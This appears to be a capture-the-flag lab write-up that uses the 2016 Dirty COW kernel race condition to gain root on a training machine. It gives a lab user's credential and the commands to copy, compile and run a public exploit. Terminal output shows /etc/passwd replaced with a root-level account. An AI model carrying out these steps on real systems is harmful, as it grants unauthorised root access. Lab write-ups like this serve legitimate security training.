### Dirty cow exploit:
---
- Summary

A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. All the information we have so far is included in this page.

The bug has existed since around 2.6.22 (released in 2007) and was fixed on Oct 18, 2016. List of patched versions here

There are proof of concepts available [here](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs).

---
- to exploit the root with dirtycow we have to access to any user shell first
- we chosse : 
    ```
    user : laurie
    pswd : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
    ```
- copy dirtycow exploit code from [here](https://github.com/FireFart/dirtycow/blob/master/dirty.c) to the laurie server, 
    `scp dirty.c laurie@10.11.100.146:~`
- compile it as the documentation says and exploit the root:
    ```
    laurie@BornToSecHackMe:~$ gcc -pthread delthis.c -o dirty -lcrypt
    gcc -pthread delthis.c -o dirty -lcrypt
    ```
- execute the binary and give any password you want
    ```
    laurie@BornToSecHackMe:~$ ./dirty
    ./dirty
    /etc/passwd successfully backed up to /tmp/passwd.bak
    Please enter the new password: 123456

    Complete line:
    firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash

    mmap: b7fda000
    madvise 0

    ptrace 0
    Done! Check /etc/passwd to see if the new user was created.
    You can log in with the username 'firefart' and the password '123456'.


    DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
    Done! Check /etc/passwd to see if the new user was created.
    You can log in with the username 'firefart' and the password '123456'.


    DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
    laurie@BornToSecHackMe:~$
    ```
- test to see if root's pswd changed
    ```
    laurie@BornToSecHackMe:~$ su firefart
    Password:
    firefart@BornToSecHackMe:/home/laurie# whoami
    firefart
    firefart@BornToSecHackMe:/home/laurie# su
    firefart@BornToSecHackMe:/home/laurie#
    ```
---

##### References :
- https://dirtycow.ninja/